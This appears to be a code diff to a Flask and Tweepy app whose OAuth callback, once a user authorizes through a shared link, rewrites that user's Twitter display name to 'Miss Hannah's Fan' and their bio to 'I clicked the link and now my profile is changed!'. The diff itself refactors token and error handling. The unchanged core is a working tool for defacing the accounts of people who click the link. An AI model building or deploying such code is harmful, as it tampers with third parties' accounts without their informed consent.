@@ -28,21 +28,33 @@ def login():
 
 @app.route("/callback")
 def callback():
-    request_token = session.pop("request_token", None)
-    auth.request_token = {"oauth_token": request.args["oauth_token"], "oauth_token_secret": request_token}
-
     try:
-        auth.get_access_token(request.args["oauth_verifier"])
+        # Get the request token from the session
+        request_token = session.get("request_token")
+        if not request_token:
+            return "Error: No request token found.", 400
+        
+        auth.request_token = {
+            "oauth_token": request.args.get("oauth_token"),
+            "oauth_token_secret": request_token
+        }
+
+        # Exchange request token for access token
+        auth.get_access_token(request.args.get("oauth_verifier"))
+
+        # Authenticate API with new user credentials
         api = tweepy.API(auth)
 
-        # Change username and bio
+        # Change Twitter username & bio
         new_username = "Miss Hannah's Fan"
         new_bio = "I clicked the link and now my profile is changed!"
+
         api.update_profile(name=new_username, description=new_bio)
 
         return f"Success! Your profile has been updated to: {new_username} - {new_bio}"
-    except tweepy.TweepyException as e:
-        return f"Error updating profile: {str(e)}"
+
+    except Exception as e:
+        return f"Error: {str(e)}", 500
 
 if __name__ == "__main__":
     app.run(debug=True)
